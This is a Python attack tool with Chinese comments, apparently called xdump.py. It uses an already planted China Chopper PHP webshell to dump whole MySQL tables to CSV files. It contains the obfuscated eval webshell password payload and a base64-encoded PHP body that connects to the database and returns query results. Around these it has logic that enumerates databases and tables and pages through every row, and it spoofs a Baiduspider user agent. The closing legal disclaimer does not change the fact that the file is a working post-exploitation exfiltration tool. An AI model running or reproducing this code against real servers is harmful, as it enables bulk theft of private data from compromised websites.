'''
#header文件格式要求
eg.

Cache-Control:no-cache
Referer:http://www.abc.com
Content-Type:application/x-www-form-urlencoded
User-Agent:Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Connection:keey-alive
Accept:*/*

#post数据文件格式要求,eg.


chopperPassValue=$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval($xx($yy[z0]));
z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRoc3Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdOyR1c3I9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejIiXSk6JF9QT1NUWyJ6MiJdOyRwd2Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejMiXSk6JF9QT1NUWyJ6MyJdOyRkYm49JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejQiXSk6JF9QT1NUWyJ6NCJdOyRzcWw9YmFzZTY0X2RlY29kZSgkX1BPU1RbIno1Il0pOyRUPUBteXNxbF9jb25uZWN0KCRoc3QsJHVzciwkcHdkKTtAbXlzcWxfcXVlcnkoIlNFVCBOQU1FUyB1dGY4Iik7QG15c3FsX3NlbGVjdF9kYigkZGJuKTskcT1AbXlzcWxfcXVlcnkoJHNxbCk7JGk9MDt3aGlsZSgkY29sPUBteXNxbF9maWVsZF9uYW1lKCRxLCRpKSl7ZWNobygkY29sLiJcdHxcdCIpOyRpKys7fWVjaG8oIlxyXG4iKTt3aGlsZSgkcnM9QG15c3FsX2ZldGNoX3JvdygkcSkpe2ZvcigkYz0wOyRjPCRpOyRjKyspe2VjaG8odHJpbSgkcnNbJGNdKSk7ZWNobygiXHR8XHQiKTt9ZWNobygiXHJcbiIpO31AbXlzcWxfY2xvc2UoJFQpOztlY2hvKCJ8PC0iKTtkaWUoKTs=
z1=this is db host
z2=this is db user
z3=this is db pass
z4=this is db name
z5=this is query param(提供的post文件里这行可以没有)
'''

import re
import base64
import sys
import os
from exp10it import get_http_domain_from_url
from exp10it import get_random_header
from exp10it import post_requests
from exp10it import get_input_intime

#global count, everyQueryCount,countOfTableDict
#Attention!!!如果一次没有dump完意外中断了,下一次继续dump的时候要改变代码中的下面的count数,并要保证
#start=everyQueryCount*count+1为继续dump的起始点的值[eg.每次查询为200,则要保证200*count+1=新起点dump处],运行之前只需要改count

count =0
start=0
everyQueryCount = 0
countOfTableDict={}
maxUid=0
primaryColumnName="0"


def getPrimaryColumnName():
    #尝试获取可以dump的主键[eg.uid,如果是非数字的主键就不能根据主键来dump数据了]
    result=query("select * from %s limit 1" % tableName)
    print("The table you select has below columns:\n")
    pureData = result.split("\r\n")[0]
    list = re.findall("([^\s\|]+)", pureData)
    for eachColumn in list:
        print(eachColumn)
    primaryColumnName=input("Please input your primaryColumnName [eg.uid,this way use `where` keyword],\n\
if there is no primaryColumnName like uid,input 0 for very slow way[this way use `order by + limit` \
keyword]:\n")
    return primaryColumnName


def HandlePostData():
    global postData, everyQueryCount, count,start,maxUid,primaryColumnName
    start = everyQueryCount * count + 1
    #下面这里要注意,直接用order by + limit查询的时候会很慢,最好先看要dump的表的主键是什么,然后根据主键用where来
    #dump,这样会比limit快很多,具体情况要根据表的主键来改变下面的query语句,根据主键来查询的时候,终止查询的地方要
    #由主键的最后一个数值来决定,不能由count(*)得到的结果来决定,因为count(*)得到的结果和通过主键[eg.uid]来得到的
    #个数可能不同,也即要由select max(uid) from table得到的数值来决定
    if primaryColumnName=="0":
        queryString = "SELECT * FROM `%s` ORDER BY 1 DESC LIMIT %d,%d" % (tableName, start, start + everyQueryCount - 1)
        if start>countOfTableDict[tableName]:
            sys.exit(1)
    else:
        #下面的语句中没有order by,如果加了order by uid limit 100000,101000也会很慢
        queryString = "SELECT * FROM `%s` where %s>=%d and %s<=%d" % (tableName,primaryColumnName,start,primaryColumnName, start + everyQueryCount - 1)

        if maxUid==0:
            #尝试得到最大的uid值
            tmpQueryString="select max(%s) from %s" % (primaryColumnName,tableName)
            print(tmpQueryString)
            result=query(tmpQueryString)
            tmp= re.search("(\d+)", result).group(1)
            maxUid=int(tmp)
            choose=input("Do you agree my got maxUid value:%d? [y|n] default[y]:" % maxUid)
            if choose=="n" or choose=='N':
                maxUid=int(input("Please input your correct maxUid value:"))
            else:
                pass
        else:
            #初次获取maxUid后以后不再获取maxUid
            pass
        if start>maxUid:
            print("已经查完了这个表")
            sys.exit(1)
    print(queryString)
    postData["z5"] = base64.b64encode(queryString.encode(encoding="utf-8"))


def query(queryString):
    global mode
    global httpHeaderContent
    global dbHost, dbUser, dbPass, dbName, postData, url, chopperPass
    if mode == 1:
        postData['z0'] = "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRoc3Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdOyR1c3I9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejIiXSk6JF9QT1NUWyJ6MiJdOyRwd2Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejMiXSk6JF9QT1NUWyJ6MyJdOyRkYm49JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejQiXSk6JF9QT1NUWyJ6NCJdOyRzcWw9YmFzZTY0X2RlY29kZSgkX1BPU1RbIno1Il0pOyRUPUBteXNxbF9jb25uZWN0KCRoc3QsJHVzciwkcHdkKTtAbXlzcWxfcXVlcnkoIlNFVCBOQU1FUyB1dGY4Iik7QG15c3FsX3NlbGVjdF9kYigkZGJuKTskcT1AbXlzcWxfcXVlcnkoJHNxbCk7JGk9MDt3aGlsZSgkY29sPUBteXNxbF9maWVsZF9uYW1lKCRxLCRpKSl7ZWNobygkY29sLiJcdHxcdCIpOyRpKys7fWVjaG8oIlxyXG4iKTt3aGlsZSgkcnM9QG15c3FsX2ZldGNoX3JvdygkcSkpe2ZvcigkYz0wOyRjPCRpOyRjKyspe2VjaG8odHJpbSgkcnNbJGNdKSk7ZWNobygiXHR8XHQiKTt9ZWNobygiXHJcbiIpO31AbXlzcWxfY2xvc2UoJFQpOztlY2hvKCJ8PC0iKTtkaWUoKTs="
        postData['z1'] = dbHost
        postData['z2'] = dbUser
        postData['z3'] = dbPass
        postData['z4'] = dbName
        postData[
            chopperPass] = "$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval($xx($yy[z0]));"

        httpHeaderContent = get_random_header()
        httpHeaderContent['Referer'] = get_http_domain_from_url(url)
        httpHeaderContent['Content-Type'] = "application/x-www-form-urlencoded"

    else:
        postData["z4"] = dbName

    postData["z5"] = base64.b64encode(queryString.encode(encoding="utf-8"))
    result = post_requests(url, data=postData, headers=httpHeaderContent)
    html = result.content.decode("utf8")
    return html[3:-3]


def main():
    os.system("pip3 install exp10it -U")
    global httpHeaderContent, postData, headerFile, postDataFile, everyQueryCount, count, dbHost,dbUser,dbPass, dbName, tableName, url, chopperPass, mode,countOfTableDict,primaryColumnName
    # count是第几次查询
    httpHeaderContent = {}
    postData = {}
    url = input("please input webshell url:")
    chopperPass = input("please input your webshell pass:")
    print("1.不抓包模式\nor\n2.抓包后模式?\n不抓包模式目前只测试过php+mysql组合 抓包后模式功能更强大\
[但是需要用charles做sock5代理,proxfier设置chopper的代理为charles提供的对应的代理地址,用charles抓到chopper\
的包后按照代码中要求的格式保存到下面要提供的文件中]\n请选择对应模式序号,默认选择1")
    mode = get_input_intime(1)
    if str(mode) == "1":
        dbHost = input("please input db host:\n")
        dbUser = input("please inpuot db user:\n")
        dbPass = input("please input db pass:\n")
        dbName = input("please input db name:\n")
    else:
        headerFile = input("please input your post header file abspath,header头要求如代码中的示例格式:\n")
        postDataFile = input("please input your post data file abspath,post数据要求如代码中的示例格式:\n")
        with open(headerFile, "r+") as f:
            for eachLine in f:
                eachLine = re.sub("\s$", "", eachLine)
                eachHeaderParam = eachLine.split(":")[0]
                eachHeaderParamValue = eachLine[len(eachHeaderParam) + 1:]
                httpHeaderContent[eachHeaderParam] = eachHeaderParamValue

        with open(postDataFile, "r+") as f:
            for eachLine in f:
                eachLine = re.sub("\s$", "", eachLine)
                eachPostParam = eachLine.split("=")[0]
                eachPostParamValue = eachLine[len(eachPostParam) + 1:]
                postData[eachPostParam] = eachPostParamValue

    while 1:
        if mode == 1:
            pass
        else:
            dbName = postData['z4']
        result = query("show databases")
        print("you are accessed on below database:\n")
        pureData = result[len(result.split("\r\n")[0] + "\r\n"):]
        list = re.findall("([^\s\|]+)", pureData)
        for eachDbname in list:
            print(eachDbname)
        dbName = input("\nplease input db name you want to dump data from:\n")
        print("\nthe db you choosed has below tables:\n")
        if countOfTableDict=={}:
            result = query("show tables")

            pureData = result[len(result.split("\r\n")[0] + "\r\n"):]
            list = re.findall("([^\s\|]+)", pureData)
            for eachTableName in list:
                result = query("select count(*) from %s" % eachTableName)
                entryNum = re.search("(\d+)", result).group(1)
                countOfTableDict[eachTableName]=int(entryNum)
                #print(eachTableName)

        for eachTableName in countOfTableDict:
            print(eachTableName+"[%d]" % int(countOfTableDict[eachTableName]))

        tableName = input("\nplease input table name you want to dump:\n")

        totalDataCount = int(input("please input how much data there are[想dump多少条数据?输入0代表dump整个表的内容]:\n"))
        everyQueryCount = int(
            input("please input how much data do you want to query each time[每次要查询多少条数据?]:\n"))
        # 下面是一共要查询的次数
        totalQueryCount = totalDataCount // everyQueryCount

        #下面尝试选择可用于脱库的主键
        primaryColumnName=getPrimaryColumnName()


        if totalQueryCount!=0:
            for i in range(totalQueryCount):
                # 下面是每次查询完后对查询参数的改变函数
                HandlePostData()

                result = post_requests(url, data=postData, headers=httpHeaderContent)
                html = result.content.decode("utf8")[3:-3]
                #print(html)
                # 菜刀中的数据是\r\n换行,如果是用大马中的post数据则有可能是\n换行符,菜刀版本不一样也有可能会是\n换行符,这里
                # 的返回的sql数据中是\r\n换行符,不同情况时这里要修改
                firstLine = html.split("\r\n")[0]
                # 第一行中以->|开头,最后一行为|<-
                firstLine2write = firstLine[3:]
                data2write = html[len(firstLine + "\r\n"):-3]
                with open("%s.csv" % tableName, "a+") as f:
                    if count == 0:
                        f.write(firstLine2write + "\r\n")
                    # 这里每次查询2000条数据,要在post文件的数据中将对应数据修改成每次要查询的条数
                    count += 1
                    num = count * everyQueryCount
                    print("查询了%d条数据" % num)
                    f.write("\r\n下面是到%d条数据:\r\n" % num)
                    f.write(data2write)
        else:
            while 1:
                # 下面是每次查询完后对查询参数的改变函数
                HandlePostData()

                result = post_requests(url, data=postData, headers=httpHeaderContent)
                html = result.content.decode("utf8")[3:-3]
                #print(html)
                # 菜刀中的数据是\r\n换行,如果是用大马中的post数据则有可能是\n换行符,菜刀版本不一样也有可能会是\n换行符,这里
                # 的返回的sql数据中是\r\n换行符,不同情况时这里要修改
                firstLine = html.split("\r\n")[0]
                # 第一行中以->|开头,最后一行为|<-
                firstLine2write = firstLine[3:]
                data2write = html[len(firstLine + "\r\n"):-3]
                with open("%s.csv" % tableName, "a+") as f:
                    if count == 0:
                        f.write(firstLine2write + "\r\n")
                    # 这里每次查询2000条数据,要在post文件的数据中将对应数据修改成每次要查询的条数
                    count += 1
                    num = start+everyQueryCount-1
                    print("查询了%d条数据" % num)
                    f.write("\r\n下面是到%d条数据:\r\n" % num)
                    f.write(data2write)

                


if __name__ == '__main__':
    print("[!] legal disclaimer: Usage of xdump.py for attacking targets without prior mutual consent is \
illegal.It is the end user's responsibility to obey all applicable local, state and federal laws. \
Developers assume no liability and are not responsible for any misuse or damage caused by this program")
    main()
